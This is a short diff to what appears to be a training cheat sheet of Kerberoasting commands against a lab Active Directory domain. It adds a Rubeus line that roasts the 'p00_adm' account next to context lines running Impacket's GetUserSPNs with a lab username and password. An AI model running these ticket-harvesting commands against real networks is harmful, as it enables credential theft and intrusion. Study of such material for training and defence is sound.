@@ -36,6 +36,7 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 -request-u
 
 # Roast specific user
 .\Rubeus.exe kerberoast /user:sqldev /nowrap
+.\Rubeus.exe kerberoast /user:p00_adm /nowrap /simple
 
 # Output to a file
 .\Rubeus.exe kerberoast /outfile:hashes.txt
